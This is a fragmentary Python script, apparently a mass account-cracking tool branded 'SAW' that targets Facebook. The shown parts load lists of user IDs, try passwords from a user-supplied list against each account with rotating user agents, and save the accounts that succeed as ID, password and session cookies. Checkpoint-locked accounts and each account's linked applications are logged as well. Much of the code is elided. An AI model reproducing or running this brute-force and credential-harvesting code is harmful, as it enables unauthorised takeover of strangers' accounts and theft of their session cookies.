...
try:
	...
	print('[[\x1b[1;92mSAW\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}SAW{x}] Cookies :{asu} ')
		...
		print(f'  {x}[{h}SAW{x}]{h} LOGIN SECCESFULL{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(nel('\t [green]%s[white] '%(my_name)))
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> ALL ID SAW{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def crack_file():
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('SAW/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('SAW/'+geh,'r').read().splitlines()
		except:
			print('>> File SAW ')
			time.sleep(2)
			back()
...
#	else:
#		taplikasi.append('no')
	pwplus=input('>> PASS ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]SAW[white]] PASSWORD BNUSA\n[[cyan]SAW[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>>  Password  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
...
def passwrd():
	...
	print(f'[{b}SAW{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}SAW{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Tools ( Y/t ) ? ')
	woi = input('>> Chooice : ')
	if woi in ['y','Y']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[SAW] ID       : {idf} [SAW] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='AOREC-XD CP'))
					open('/sdcard/SAW/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/SAW/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[SAW] ID       : {idf}\n[SAW] PASSWORD : {pw}\n[SAW] COOKIES  : {kuki}'
					...
					infoakun += (f"\n[bold cyan][SAW] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					...
					hit=0
					infoakun += (f"\n[bold yellow][SAW] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green][SAW] ID       : {idf}\n[SAW] PASSWORD : {pw}\n[SAW] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s SAW %s/%s SAW OK:%s SAW CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
